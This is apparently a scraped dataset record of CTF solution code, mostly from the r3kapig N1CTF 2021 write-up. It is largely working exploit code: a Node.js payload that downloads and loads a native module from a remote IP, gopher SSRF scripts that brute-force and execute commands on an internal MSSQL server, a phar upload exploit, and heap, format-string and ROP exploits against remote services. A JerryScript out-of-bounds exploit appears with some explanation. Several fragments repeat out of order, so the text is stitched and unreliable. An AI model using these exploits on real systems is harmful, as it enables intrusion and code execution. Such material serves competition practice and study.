\"fs=require(\\\"fs\\\");f=fs.openSync(\\\"/tmp/styp.node\\\",\\\"w\\\");http=require(\\\"http\\\");http.get({ host:\\\"158.101.144.10\\\",port:80,path:\\\"/styp.node?q\\\"},function(r){r.on(\\\"data\\\",function(c){fs.writeSync(f, nc, 0, c.length);});r.on(\\\"end\\\", function(){fs.closeSync(f);process.exit(1);})});\"\npayload_init = payload.format(node=gadget_init)\n\nr = requests.get(url.format(payload_init))\nprint(r.text)\n\n\"\"\"\nRun my native module\n\nsty = require(\"/tmp/styp.node\")\nconsole.log(sty)\n\"\"\"\ngadget_shell = \"sty=require(\\\"/tmp/styp.node\\\");console.log(sty);\"\npayload_shell = payload.format(node=gadget_shell)\n\nr = requests.get(url.format(payload_shell))\nprint(r.text)\n\n\nimport os\nimport requests\n\ndef leak_password():\n    \"\"\" Leaks the content of file:///password.txt \"\"\"\n    hash = \"7b3ba344-2974-c748-8558-102060de0902\"\n    d = {\n        \"url\": \"fi[j-m]e:///{password.txt,\"+hash+\"}\"\n    }\n    h = {\n        \"Cookie\": \"PHPSESSID=rhi443hsuiglkntgqf7vgdpf8l\",\n        \"Content-Type\": \"application/x-www-form-urlencoded\"\n    }\n    # print(requests.post(\"https://fo.ax/f.php\",  data=d, headers=h).text)\n    r = requests.post(\"http://129.226.12.144/index.php\", headers=h, data=d)\n    print(r.headers)\n    return r.text\n\ndef ssrf_bruteforce():\n    \"\"\" Bruteforce for the password \"\"\"\n    # Password is 32367d71-af9b-4996-852f-f5566c13971a\n\n    password_list = []\n    with open(\"password.txt\", \"r\") as f:\n        password_list = [i.strip() for i in f.read().split() if i]\n\n    for password in password_list:\n        _res = os.popen(f\"php gen_payload.php {password} \\\"SELECT 'ASDFASDF'\\\"\").read()\n        # This is to bypass the l, g\n        _res = _res.replace(\"l\", \"%6C\").replace(\"g\", \"%67\")\n        _res = _res.replace(\"L\", \"%4C\").replace(\"G\", \"%47\")\n\n        hash = \"7b3ba344-2974-c748-8558-102060de0902\"\n        d = {\"url\": \"[f-h]opher://10.11.22.9:1433/A{\"+_res+\",\"+hash+\"}\"}\n        h = {\n            \"Cookie\": \"PHPSESSID=rhi443hsuiglkntgqf7vgdpf8l\",\n            \"Content-Type\": \"application/x-www-form-urlencoded\"\n        }\n        r = requests.post(\"http://129.226.12.144/index.php\", headers=h, data=d)\n        print(r.headers)\n        t = r.text\n        # Check if invalid authentication message does not exist\n        if \"\\x00\\x69\\x00\\x6c\\x00\\x65\\x00\\x64\\x00\\x20\\x00\\x66\\x00\\x6f\\x00\\x72\" not in t:\n            print(\">>>>>>>>>\" + password)\n            exit(0)\n\ndef ssrf_run_cmd():\n    password = \"32367d71-af9b-4996-852f-f5566c13971a\"\n    _res = os.popen(f\"php gen_payload.php {password} \\\"EXECUTE master.sys.xp_regenumvalues 'HKEY_LOCAL_MACHINE','Software\\\\N1CTF2021'\\\"\").read()\n    #  _res = os.popen(f\"php gen_payload.php {password} \\\"EXECUTE master.sys.xp_regread 'AAAAAAAAAAAAAAAAAAAAA'\\\"\").read()\n    # This is to bypass the l, g\n    _res = _res.replace(\"l\", \"%6C\").replace(\"g\", \"%67\")\n    _res = _res.replace(\"L\", \"%4C\").replace(\"G\", \"%47\")\n\n    hash = \"7b3ba344-2974-c748-8558-102060de0902\"\n    d = {\"url\": \"[f-h]opher://10.11.22.9:1433/A{\"+_res+\",\"+hash+\"}\"}\n    h = {\n        \"Cookie\": \"PHPSESSID=rhi443hsuiglkntgqf7vgdpf8l\",\n        \"Content-Type\": \"application/x-www-form-urlencoded\"\n    }\n    r = requests.post(\"http://129.226.12.144/index.php\", headers=h, data=d)\n    t = r.text\n    return t\n\nif __name__ == \"__main__\":\n    # print(leak_password())\n    # print(ssrf_bruteforce())\n    print(ssrf_run_cmd())\n\n\n# NOTE: python2\nimport os\nimport sys\nimport struct\nimport requests\nfrom datetime import datetime\n\ndef calc_checksum(data):\n    return sum(struct.unpack_from(\"148B8x356B\",data))+256\n\nif __name__==\"__main__\":\n    # generate date and phar content\n    generated_date = os.popen(\"php exp_gen.php\").read().split(\"FLAG: \")[0]\n    generated_type = \"styp979\"\n    generated_metadata = \"Time: \" + generated_date + \" IP: [], REQUEST: [log_type=\" + generated_type + \"], CONTENT: [\"\n\n    # make it into phar format\n    with open(\"get_flag.tar\", \"rb\") as f:\n        data = f.read()\n    new_name = generated_metadata.ljust(100,'\\x00').encode()\n    new_data = new_name + data[100:]\n    checksum = calc_checksum(new_data)\n    new_checksum = oct(checksum).rjust(7,'0').encode()+b'\\x00'\n    new_data = new_name + data[100:148] + new_checksum + data[156:]\n    with open(\"get_flag.log\", \"wb\") as f:\n        f.write(new_data)\n        f.write(b\"]\\n\")\n\n    # request to server..\n    print(\"Sending exp to the server...\")\n    with open(\"get_flag.log\", \"rb\") as f:\n        requests.post(\"http://43.155.59.185:53340/log.php?log_type=\" + generated_type, data=f.read().replace(generated_metadata, \"\").replace(\"]\\n\",\"\")).text\n\n    # getflag\n    print(\"Getflag!\")\n    print(requests.get(\"http://43.155.59.185:53340/index.php?file=phar://log/158.101.144.10/\" +generated_type + \"_www.log\").text)\n\n    # 10.11.22.9 , 1443, sa\n    # HKEY_LOCAL_MACHINE\\SOFTWARE\\N1CTF2021\n    print(prelogin())\n    # def login(server, database, username, password='', domain='', hashes = None, useWindowsAuth = False):\n    print(login('10.11.22.9', None, 'sa', password='123456'))\n    print(exec_query(\"SELECT 1337\")) # Note: 2 bytes needs to be added on top of it, gopher adds \\r\\n\n\n\n    \"\"\" Leaks the content of file:///password.txt \"\"\"\n    hash = \"7b3ba344-2974-c748-8558-102060de0902\"\n    d = {\n        \"url\": \"fi[j-m]e:///{password.txt,\"+hash+\"}\"\n    }\n    h = {\n        \"Cookie\": \"PHPSESSID=rhi443hsuiglkntgqf7vgdpf8l\",\n        \"Content-Type\": \"application/x-www-form-urlencoded\"\n    }\n    # print(requests.post(\"https://fo.ax/f.php\",  data=d, headers=h).text)\n    r = requests.post(\"http://129.226.12.144/index.php\", headers=h, data=d)\n    print(r.headers)\n    return r.text\n\n\n        hash = \"7b3ba344-2974-c748-8558-102060de0902\"\n        d = {\"url\": \"[f-h]opher://10.11.22.9:1433/A{\"+_res+\",\"+hash+\"}\"}\n        h = {\n            \"Cookie\": \"PHPSESSID=rhi443hsuiglkntgqf7vgdpf8l\",\n            \"Content-Type\": \"application/x-www-form-urlencoded\"\n        }\n        r = requests.post(\"http://129.226.12.144/index.php\", headers=h, data=d)\n        print(r.headers)\n        t = r.text\n        # Check if invalid authentication message does not exist\n        if \"\\x00\\x69\\x00\\x6c\\x00\\x65\\x00\\x64\\x00\\x20\\x00\\x66\\x00\\x6f\\x00\\x72\" not in t:\n            print(\">>>>>>>>>\" + password)\n            exit(0)\n\n\n    # print(leak_password())\n    # print(ssrf_bruteforce())\n    print(ssrf_run_cmd())\n\n\n    # request to server..\n    print(\"Sending exp to the server...\")\n    with open(\"get_flag.log\", \"rb\") as f:\n        requests.post(\"http://43.155.59.185:53340/log.php?log_type=\" + generated_type, data=f.read().replace(generated_metadata, \"\").replace(\"]\\n\",\"\")).text\n\n\n    # getflag\n    print(\"Getflag!\")\n    print(requests.get(\"http://43.155.59.185:53340/index.php?file=phar://log/158.101.144.10/\" +generated_type + \"_www.log\").text)\n", "tools": ["python"], "file_path": "temp_repos\\r3kapig_writeup\\20211111-n1ctf-web\\README.md", "file_size": 29516, "scraped_at": "2025-10-26T18:19:26.738455"}
{"id": "r3kapig_writeup_N1CTF_2021_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "N1CTF 2021 Writeup", "attack_type": "AES", "writeup": "# N1CTF 2021 Writeup\n\n本次比赛我们获得了第二名的成绩\n\n![](https://i.imgur.com/DBz5XOb.png)\n\n现将师傅们的 wp 整理如下，分享给大家一起学习进步~ 同时也欢迎各位大佬加入 r3kapig 的大家庭，大家一起学习进步，相互分享~ 简历请投战队邮箱：root@r3kapig.com\n\n\n## Pwn\n\n### BabyFMT\n\n修改了printf,和scanf。题目中有个fmtstr的漏洞，但是printf只剩下%r%m可以泄露，仔细看了下发现有个%\\0的处理有问题会造成溢出所以泄露后把__free_hook链tache就可以getshell.\n\n```python\nfrom pwn import *\ncontext.log_level='debug'\ndef cmd(c):\n    p.sendlineafter(\">\",str(c).encode('utf-8'))\ndef add(size,author=b\"a\",c=b'c'):\n    cmd(1)\n    p.sendlineafter(\":\",b\"Content size is \"+str(size).encode('utf-8'))\n    p.sendlineafter(\":\",b\"Book author is \"+author)\n    p.sendlineafter(\":\",b\"Book content is \"+c)\ndef free(idx):\n    cmd(2)\n    p.sendlineafter(\":\",b'Book idx is '+str(idx).encode('utf-8'))\ndef puts(s,idx=0):\n    cmd(3)\n    p.sendlineafter(\":\",b'Book idx is '+str(idx).encode('utf-8'))\n    p.sendlineafter(\"You can show book by yourself\\n\",b'My format '+s)\n\np=remote(\"43.155.72.106\",9999)\n#p=process(\"./pwn\")\nfor x in range(9):\n    add(0x68)\nfor x in range(1,8):\n    free(x)\nfree(0)\nfor x in range(7):\n    add(0x68)\nadd(0x1)\n\nputs(b\"%r%m%r\",7)\nbase=u64(p.read(6)+b'\\0\\0')-(0x7ffff7facc61-0x7ffff7dc1000)\nlog.warning(hex(base))\nfree(5)\n\nfree(6)\nputs(b'%1%\\0'+b\"\\1\"*0x5e+p64(0x1eeb28-0x10+base))\n\n#puts(b'%\\0'+b\"\\1\"*0xb0+p64(0x1eeb28-0x10+base))\nadd(0x68)\n\n#gdb.attach(p,'b *malloc')\nputs(b\"/bin/sh;%%%%%%%\\x0011111\"+p64(0x55410+base))\np.interactive()\n```\n\n### Jerry\n\n通过 bindiff 比对，然后找到被修改的位置:\n\n```\ndiff --git a/jerry-core/ecma/operations/ecma-dataview-object.c b/jerry-core/ecma/operations/ecma-dataview-object.c\nindex 45db1e00..0b4cac50 100644\n--- a/jerry-core/ecma/operations/ecma-dataview-object.c\n+++ b/jerry-core/ecma/operations/ecma-dataview-object.c\n@@ -108,10 +108,10 @@ ecma_op_dataview_create (const ecma_value_t *arguments_list_p, /**< arguments li\n     }\n \n     /* 8.b */\n-    if (offset + byte_length_to_index > buffer_byte_length)\n-    {\n-      return ecma_raise_range_error (ECMA_ERR_MSG (\"Start offset is outside the bounds of the buffer\"));\n-    }\n+    // if (offset + byte_length_to_index > buffer_byte_length)\n+    // {\n+    //   return ecma_raise_range_error (ECMA_ERR_MSG (\"Start offset is outside the bounds of the buffer\"));\n+    // }\n \n     JERRY_ASSERT (byte_length_to_index <= UINT32_MAX);\n     view_byte_length = (uint32_t) byte_length_to_index;\n```\n\n删掉了一个 DataView 创建时的长度合法性检测，这意味着我们申请的 DataView 长度可以大于 ArrayBuffer，从而实现 oob。有了 oobArray 就很简单了，基本步骤：\n\nleak elf_base → leak got → leak libc → leak stack → hijack main_ret with one_gadget\n\n```javascript\nvar buffer = new ArrayBuffer(0x10)\nvar buffer2 = new ArrayBuffer(0x10)\ndata2=new DataView(buffer,0,0x100)\ndata=new DataView(buffer2,0,0x100)\ndata.setUint32(0,0x41414141)\ndata.setUint32(4,0x41414141)\ndata2.setUint32(0,0x42424242)\ndata2.setUint32(4,0x42424242)\njerry_gloal_heap_offset=0x68\njerry_gloal_heap=data.getUint32(jerry_gloal_heap_offset+4,true)*0x100000000+data.getUint32(jerry_gloal_heap_offset,true)\ntext_base=jerry_gloal_heap-0x6d480\nrealloc_got=text_base+0x00000000006bf00+0x10\nprint(jerry_gloal_heap.toString(16))\nprint(text_base.toString(16))\nprint(realloc_got.toString(16))\ndata.setUint32(jerry_gloal_heap_offset,realloc_got&0xffffffff,true)\n\nlibc_base=data2.getUint32(4,true)*0x100000000+data2.getUint32(0,true)-0x97b20\nprint(libc_base.toString(16))\nenv=libc_base+0x1e45a0-0x10\nprint(env.toString(16))\ndata.setUint32(jerry_gloal_heap_offset,env&0xffffffff,true)\ndata.setUint32(jerry_gloal_heap_offset+4,env/0x100000000,true)\n\nstack=data2.getUint32(4,true)*0x100000000+data2.getUint32(0,true)\nprint(stack.toString(16))\nret_addr=stack-0x108-0x10\nogg=libc_base+[0xde78c,0xde78f,0xde792][1]\ndata.setUint32(jerry_gloal_heap_offset,ret_addr&0xffffffff,true)\ndata.setUint32(jerry_gloal_heap_offset+4,ret_addr/0x100000000,true)\ndata2.setUint32(0,ogg&0xffffffff,true)\ndata2.setUint32(4,ogg/0x100000000,true)\n```\n\n### House_of_tataru\n\n菜单选项1不满足fail-safe的要求，可以随意修改大于0x1000的size。因为meta在heap上所以可以通过上面的那个漏洞读heap地址。然后bss上有几个freedchunk所以就可以先获得他们，之后猜一个bss和heap的偏移（最小1页最多0x2000页）然后就可以修改heap上的meta->mem，就可以通过选项1完成任意写。之后因为calloc还有exit里面都走了奇怪的分支把两个指针用任意写改掉，然后做FSOP+ROP就可以读flag，概率有点低是1/0x2000\n\n```python\nfrom pwn import *\ndef cmd(c):\n    p.sendafter(\":\",str(c).encode('utf-8'))\ndef add(magic=0xff,idx=0,c=b'A'):\n    cmd(1)\n    p.send(p32(magic))\n    p.send(p8(idx))\n    if(magic<0x1000):\n        p.send(c)\ndef leave(idx=0):\n    cmd(2)\n    p.send(p8(idx))\ndef read(c,idx=0):\n    cmd(3)\n    p.send(p8(idx))\n    p.send(c)\ndef show(idx=0):\n    cmd(4)\n    p.send(p8(idx))\n\n\ndef ddd():\n    global p\n    print(pidof(p))\n    raw_input()\nimport os\nlocal=0\nif(1):\n    try:\n        if(local):\n            p=process(b\"/usr/sbin/chroot --userspec=1000:1000 /home/ctf ./pwn\".split(b\" \"))\n        else:\n            p=remote(\"43.155.68.132\",23333,timeout=90)\n        \n        context.terminal=['tmux','split','-h']\n        add(0xfff,0,b\"\\1\")\n        add(0x888,1,b'\\2')\n        \n\n        add(0x1fd0,1,b'1')\n        leave(1)\n        show(1)\n        p.read(0x30)\n        heap=u64(p.read(6)+b'\\0\\0')-(0x55e4fd7ef1a8-0", "solution_code": "from pwn import *\ncontext.log_level='debug'\ndef cmd(c):\n    p.sendlineafter(\">\",str(c).encode('utf-8'))\ndef add(size,author=b\"a\",c=b'c'):\n    cmd(1)\n    p.sendlineafter(\":\",b\"Content size is \"+str(size).encode('utf-8'))\n    p.sendlineafter(\":\",b\"Book author is \"+author)\n    p.sendlineafter(\":\",b\"Book content is \"+c)\ndef free(idx):\n    cmd(2)\n    p.sendlineafter(\":\",b'Book idx is '+str(idx).encode('utf-8'))\ndef puts(s,idx=0):\n    cmd(3)\n    p.sendlineafter(\":\",b'Book idx is '+str(idx).encode('utf-8'))\n    p.sendlineafter(\"You can show book by yourself\\n\",b'My format '+s)\n\np=remote(\"43.155.72.106\",9999)\n#p=process(\"./pwn\")\nfor x in range(9):\n    add(0x68)\nfor x in range(1,8):\n    free(x)\nfree(0)\nfor x in range(7):\n    add(0x68)\nadd(0x1)\n\nputs(b\"%r%m%r\",7)\nbase=u64(p.read(6)+b'\\0\\0')-(0x7ffff7facc61-0x7ffff7dc1000)\nlog.warning(hex(base))\nfree(5)\n\nfree(6)\nputs(b'%1%\\0'+b\"\\1\"*0x5e+p64(0x1eeb28-0x10+base))\n\n#puts(b'%\\0'+b\"\\1\"*0xb0+p64(0x1eeb28-0x10+base))\nadd(0x68)\n\n#gdb.attach(p,'b *malloc')\nputs(b\"/bin/sh;%%%%%%%\\x0011111\"+p64(0x55410+base))\np.interactive()\n\nfrom pwn import *\ndef cmd(c):\n    p.sendafter(\":\",str(c).encode('utf-8'))\ndef add(magic=0xff,idx=0,c=b'A'):\n    cmd(1)\n    p.send(p32(magic))\n    p.send(p8(idx))\n    if(magic<0x1000):\n        p.send(c)\ndef leave(idx=0):\n    cmd(2)\n    p.send(p8(idx))\ndef read(c,idx=0):\n    cmd(3)\n    p.send(p8(idx))\n    p.send(c)\ndef show(idx=0):\n    cmd(4)\n    p.send(p8(idx))\n\n\ndef ddd():\n    global p\n    print(pidof(p))\n    raw_input()\nimport os\nlocal=0\nif(1):\n    try:\n        if(local):\n            p=process(b\"/usr/sbin/chroot --userspec=1000:1000 /home/ctf ./pwn\".split(b\" \"))\n        else:\n            p=remote(\"43.155.68.132\",23333,timeout=90)\n        \n        context.terminal=['tmux','split','-h']\n        add(0xfff,0,b\"\\1\")\n        add(0x888,1,b'\\2')\n        \n\n        add(0x1fd0,1,b'1')\n        leave(1)\n        show(1)\n        p.read(0x30)\n        heap=u64(p.read(6)+b'\\0\\0')-(0x55e4fd7ef1a8-0x000055e4fd7ef000)\n        log.warning(hex(heap))\n        context.log_level='error'\n        \n\n        add(0x38)# \n\n\n        if(local):\n            pid=pidof(p)\n            pid = str(pid)[1:-1]\n            ccc=f\"sed -n '5p' /proc/{pid}/maps\"\n            res=os.popen(ccc).read()[:12]\n            bss = int(\"0x\"+res,16)\n            log.warning(hex(bss))\n        else:\n            bss = heap-0x132000\n        \n        target = heap-bss -0xfa0\n        #log.warning(hex(target))\n        add(target+0xf0)\n        leave()\n        \n        show()\n        p.read(0x30)\n        base=u64(p.read(6)+b'\\0\\0')-(0x7efd9dcd1040-0x00007efd9dc1a000)\n        \n        if(base&0xfff!=0):\n            exit(1)\n        log.warning(hex(base))\n        \n        #AAR\n        #add(0x80,1,p64(0xdeadbeef))\n        FK = 0x7f5a39a37f80-0x7f5a39981000+base\n        log.warning(\"Calloc Guard->\"+hex(FK))\n        add((0x140+heap) - (bss+0xfa0),0)\n        leave()\n        add((0x140+heap) - (bss+0xfa0)+0x100,0)\n        \n        read(p64(FK-0x30))\n        add(0x80,1,p64(0)*2+p64(0xffffffffffffffff))\n        \n        # add(0xc0,1,p64(0xdeadbeef))#locate\n        \n        GUARD = 0x7fd7b6e3af20-0x7fd7b6d84000+base# exit guard\n        context.log_level='debug'\n        log.warning(\"Exit Guard->\"+hex(GUARD))\n        add((0x168+heap) - (bss+0xfa0),0)\n        leave()\n        add((0x168+heap) - (bss+0xfa0)+0x100,0)\n        read(p64(GUARD-0x30))\n\n\n        add(0xb0,1,p64(0).ljust(0x50,b'\\0')+p64(0xffffffffffffffff)*3)\n#        add(0xd0,1,p64(0xdeadbeef))# locate\n\n        context.arch='amd64'\n        rdx = 0x000000000002cdae+base\n        rdi = 0x00000000000152a1+base\n        rsi = 0x000000000007897d+base # rbp\n        rax = 0x0000000000016a96+base\n        leaver = 0x000000000007b088+base\n        sys_read = 0x7f2ea1052f10-0x7f2ea0fde000+base\n        sys_open = 0x7f2ea0ffda70-0x7f2ea0fde000+base\n        sys_write = 0x7f2ea1053700-0x7f2ea0fde000+base\n        rebase = 0x7f2ea10923f8-0x7f2ea0fde000+base\n        syscall = 0x7b3f6+base\n        payload = flat([\n            0,0,\n            0xdeadbeef,\n            0x0000000000016e7e+base,\n            0xb43c0+base,\n            0xb43c0+base-0x40,\n            0xdeadbeef,\n            rsi,\n            rebase,leaver,rdi,0,rdx,0x1000,sys_read,3,4,0xffffffffffffffff\n        ])\n        FSOP = 0xb43a0+base\n        log.warning(\"FSOP->\"+hex(FSOP))\n        add((0xa0+heap) - (bss+0xfa0),0)\n        leave()\n        add((0xa0+heap) - (bss+0xfa0)+0x100,0)\n        read(p64(FSOP-0x30))\n        \n        add(0xd0,1,payload)\n        #ddd()\n        \n        cmd(5)\n        rop=flat([\n        rdi,rebase+0x199,rsi,0,0,rdx,0,rax,2,syscall,\n        rdi,3,rsi,rebase,0,rdx,0x99,sys_read,\n        rdi,1,rsi,rebase,0,rdx,0x99,sys_write\n        ])\n        p.send(rop.ljust(0x199,b'\\0')+b\"./flag\\0\")\n        \n        t=p.readuntil(b\"\\n\")\n        res=p.read()\n        print(res)\n        log.warning(hex(base))\n        raw_input()\n        \n        #gdb.attach(p,'vmmap')\n        p.interactive()\n    except Exception:\n        p.close()\n\nimport tornado.ioloop\nimport tornado.web\nimport builtins\nimport unicodedata\nimport uuid\nimport os\nimport re\n\ndef filter(data):\n    data = unicodedata.normalize('NFKD',data)\n    if len(data) > 1024:\n        return False\n    if re.search(r'__|\\(|\\)|datetime|sys|import',data):\n        return False\n    for k in builtins.__dict__.keys():\n        if k in data:\n            return False\n    return True\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.render(\"templates/index.html\",)\n    def post(self):\n        data = self.get_argument(\"data\")\n        if not filter(data):\n            self.finish(\"no no no\")\n        else:\n            id = uuid.uuid4()\n            f = open(f\"uploads/{id}.html\",'w')\n            f.write(data)\n            f.close()\n            try:\n                self.render(f\"uploads/{id}.html\",)\n            except:\n                self.finish(\"error\")\n            os.unlink(f\"uploads/{id}.html\")\n\ndef make_app():\n    return tornado.web.Application([\n        (r\"/\", IndexHandler),\n    ],compiled_template_cache=False)\n\nif __name__ == \"__main__\":\n    app = make_app()\n    app.listen(8888)\n    tornado.ioloop.IOLoop.current().start()\n\nclass _Expression(_Node):\n    def __init__(self, expression: str, line: int, raw: bool = False) -> None:\n        self.expression = expression\n        self.line = line\n        self.raw = raw\n\n    def generate(self, writer: \"_CodeWriter\") -> None:\n        writer.write_line(\"_tt_tmp = %s\" % self.expression, self.line) # ⚠vulnerable\n        writer.write_line(\n            \"if isinstance(_tt_tmp, _tt_string_types):\" \" _tt_tmp = _tt_utf8(_tt_tmp)\",\n            self.line,\n        )\n        writer.write_line(\"else: _tt_tmp = _tt_utf8(str(_tt_tmp))\", self.line)\n        if not self.raw and writer.current_template.autoescape is not None:\n            # In python3 functions like xhtml_escape return unicode,\n            # so we have to convert to utf8 again.\n            writer.write_line(\n                \"_tt_tmp = _tt_utf8(%s(_tt_tmp))\" % writer.current_template.autoescape, # ⚠vulnerable\n                self.line,\n            )\n        writer.write_line(\"_tt_append(_tt_tmp)\", self.line)\n\nimport idaapi\nimport idautils\nimport ida_dbg\nimport time\nimport struct\nimport ida_bytes\nfrom ctypes import *\n\nkeyreg='xmm0'\ng_fp=open('flow.txt','w+')\ndef myexit():\n    g_fp.close()\n    exit()\ndef log_code(code):\n    global g_fp\n    g_fp.write(code+'\\n')\n    print(code)\ndef cvt_xmmi(s):\n    a=\"\"\n    for i in s:\n        a+='\\\\x'+hex(i)[2:]\n    return 'b2m(\\\"'+a+'\\\")'\ndef prase_opxmmi(ip):\n    global keyreg\n    opreg=''\n    val_idx=0\n    if print_operand(ip,1)==keyreg:\n        opreg=print_operand(ip,2)\n        val_idx=2\n    else:\n        if print_operand(ip,2)!=keyreg:\n            myexit()\n        opreg=print_operand(ip,1)\n        val_idx=1\n    if opreg.find('rbp')!=-1:\n        rbp_off=get_operand_value(ip,val_idx)\n        rbp_off=struct.unpack('q',struct.pack('Q',rbp_off))[0]\n        rbp=ida_dbg.get_reg_val('rbp')\n        data_pos=rbp+rbp_off\n        bdata=ida_bytes.get_bytes(data_pos,16)\n        return cvt_xmmi(bdata)\n    else:\n        return cvt_xmmi(ida_dbg.get_reg_val(opreg))\ndef prase_opxmmi2(ip):\n    global keyreg\n    if print_operand(ip,1)!=keyreg:\n        myexit()\n    opreg=print_operand(ip,2)\n    if opreg.find('rbp')!=-1:\n        rbp_off=get_operand_value(ip,2)\n        rbp_off=struct.unpack('q',struct.pack('Q',rbp_off))[0]\n        rbp=ida_dbg.get_reg_val('rbp')\n        data_pos=rbp+rbp_off\n        bdata=ida_bytes.get_bytes(data_pos,16)\n        return cvt_xmmi(bdata)\n    else:\n        return cvt_xmmi(ida_dbg.get_reg_val(opreg))\ndef prase_vpxor(ip):\n    xmmi=prase_opxmmi(ip)\n    log_code('dst=xorq(dst,'+xmmi+');')\ndef prase_vpaddq(ip):\n    xmmi=prase_opxmmi(ip)\n    log_code('dst=addq(dst,'+xmmi+');')\ndef prase_vpsubq(ip):\n    global keyreg\n    xmmi=prase_opxmmi(ip)\n    if print_operand(ip,1)!=keyreg:\n        myexit()\n    else:\n        log_code('dst=subq(dst,'+xmmi+');')\n\ndef prase_vaesenc(ip):\n    xmmi=prase_opxmmi2(ip)\n    log_code('dst=aesenc(dst,'+xmmi+');')\ndef prase_vaesenclast(ip):\n    xmmi=prase_opxmmi2(ip)\n    log_code('dst=aesenclast(dst,'+xmmi+');')\ndef prase_vaesdec(ip):\n    xmmi=prase_opxmmi2(ip)\n    log_code('dst=aesdec(dst,'+xmmi+');')\ndef prase_vaesdeclast(ip):\n    xmmi=prase_opxmmi2(ip)\n    log_code('dst=aesdeclast(dst,'+xmmi+');')\ndef prase_vpshufd(ip):\n    _ord=hex(get_operand_value(ip,2))[2:]\n    log_code('dst=pshufd(dst,0x'+_ord+');')\nwhile(True):\n    if ip == 0x7FF6C0AD88FA:\n            myexit()\n    ip=ida_dbg.get_reg_val(\"rip\")\n    #print(hex(ip)[2:])\n    dis=GetDisasm(ip)\n    mnem=print_insn_mnem(ip)\n    if print_operand(ip,0)==keyreg:\n        if mnem == 'vmovdqa':\n            break\n        if mnem == 'vpxor':\n            prase_vpxor(ip)\n        elif mnem == 'vpshufd':\n            prase_vpshufd(ip)\n        elif mnem == 'vpaddq':\n            prase_vpaddq(ip)\n        elif mnem == 'vpsubq':\n            prase_vpsubq(ip)\n        elif mnem == 'vaesenc':\n            prase_vaesenc(ip)\n        elif mnem == 'vaesenclast':\n            prase_vaesenclast(ip)\n        elif mnem == 'vaesdec':\n            prase_vaesdec(ip)\n        elif mnem == 'vaesdeclast':\n            prase_vaesdeclast(ip)\n        elif mnem == 'vaesimc':\n            break\n        else:\n            break\n        \n    ida_dbg.step_over()\n    ida_dbg.wait_for_next_event(ida_dbg.WFNE_SUSP,2)\n\nfp=open('newflow.txt','r')\nflow_array=[]\nfor i in fp:\n    flow_array.append(i)\n\nprint(len(flow_array))\nalls=''\nfor i in range(0,len(flow_array)):\n    line=flow_array[len(flow_array)-i-1]\n    newline=line[0:6]+'re_'+line[6:]\n    alls+=newline\n\nfp.close();\nfp=open('rev_flow.txt','w+')\n\nfp.write(alls)\nfp.close()\n\nfrom sage.all import *\n\nF = Zmod(0x125)\n\ndats = [\n    (\n        5377102, 44718284, 65149487, 35629177, 16687834, 12649121, 20133359, 27627194, 8881295, 52185491, 17564837,\n        1272949,\n        51420184, 15249722, 40743553, 11448910, 68),\n    (15513275, 48100308, 8677693, 410852, 14512921, 40946083, 11650930, 46765687, 3705469, 34235932, 37493724, 31668013,\n     58592730, 35099188, 46007731, 48411728, 73),\n    (51342117, 17611295, 46626798, 44419237, 41219106, 12201596, 52093804, 15752138, 20900966, 34002181, 3328881,\n     9778043, 61937243, 28320092, 22952329, 11388094, 105),\n    (57970260, 46862881, 45916134, 43159917, 28388843, 9676221, 36591851, 16650010, 36167240, 63801756, 45673314,\n     59151919, 23972020, 38457326, 2137413, 34715169, 26),\n    (32808901, 11375397, 28326782, 40013998, 40100057, 56977904, 23526593, 21483823, 56539279, 10941397, 24023407,\n     66315899, 50854754, 20365833, 49899769, 65951721, 278),\n    (52471216, 40551307, 47833723, 32746957, 282427, 36309373, 52604124, 63871055, 34514986, 25927713, 11073096,\n     11857558, 39192608, 53262276, 8291395, 13044253, 236),\n    (24199242, 37064630, 47531426, 66810519, 61739612, 62585890, 38269989, 32578112, 28922206, 17699555, 52918290,\n     6761227, 30745745, 1682385, 48980070, 37348869, 261),\n    (\n        12966608, 34693296, 54221555, 32345456, 1903443, 34021426, 50757695, 9801829, 41831746, 45032298, 9672908,\n        58876674,\n        65789447, 60438120, 30396598, 62202924, 90),\n    (25298698, 55027617, 63071621, 7969099, 49780363, 63670216, 50679759, 41122881, 18966262, 17349024, 2668953,\n     59077744, 8593554, 34796144, 31874820, 29937890, 173),\n    (\n        599957, 11891252, 34874075, 32524194, 61745538, 26060497, 18424162, 53660494, 1201444, 54575969, 37180051,\n        62966701,\n        39797887, 16103318, 57153581, 17388834, 55),\n    (\n        52820893, 49623029, 9330086, 27114985, 61462529, 61723044, 8246048, 59291588, 35129803, 18108987, 7550306,\n        67056908,\n        31750158, 42011531, 18660303, 28288668, 229),\n    (\n        3226343, 63976576, 64477078, 20940616, 32271858, 8400987, 32491361, 32731509, 36725663, 1598982, 37370364,\n        41009760,\n        58809916, 51093211, 43880816, 21003028, 292),\n    (11484407, 18322594, 31148317, 52408555, 59525552, 5235806, 6702116, 53260842, 19179549, 23703928, 20336759,\n     24738818, 21200580, 63640408, 51302172, 7196185, 43),\n    (28563837, 14524437, 11571592, 44514143, 42212815, 49813519, 54404660, 28977207, 50811576, 11016018, 34665752,\n     57509360, 12159655, 8717460, 32686335, 34266111, 5),\n    (\n        33392211, 7979743, 61382021, 35672785, 22833691, 52860393, 8630338, 5700458, 44480266, 18911756, 58513213,\n        27865128,\n        16783819, 18997872, 24282261, 39608187, 276),\n    (28529793, 61959315, 23103319, 11554134, 40628674, 31294575, 17218640, 9249973, 13077670, 50326885, 15741379,\n     4029227, 886406, 55982584, 31034972, 23299004, 165),\n    (2075035, 58384561, 49647471, 24338954, 30588692, 9418491, 38289933, 41390328, 43235505, 26341415, 28645103,\n     50452614, 39840129, 61149522, 4371300, 32579505, 217),\n    (39948186, 19156834, 31133287, 30084536, 35248885, 26835402, 25602134, 34823251, 1866553, 48298737, 52095831,\n     14841955, 24081438, 52610483, 8163681, 29828862, 207),\n    (620322, 1371418, 41109851, 26104149, 44652087, 52819211, 39349501, 9965987, 31002578, 31387649, 53199974, 20246162,\n     16795502, 33373239, 36682310, 60508155, 1),\n    (0x1d60734,0x3f49d23,0x19dcd96,0x1e6e5ea,0x3d01ef4,0xe35c9,0x240b433,0x16aa43e,0x1c13291,0x23edd00,0x2bdc439,0x25bb3fc,0x11a1801,0x2f2339b,0x5093eb,0x1ce4ecf, 0x15),\n]\n\nM = Matrix(F, dats)\ny = M[:,-1]\nM = M[:,:-1]\n#print(M)\nx = M.solve_right(y)\nassert M*x == y\nprint(x.list())\n\nfrom typing import List\nfrom 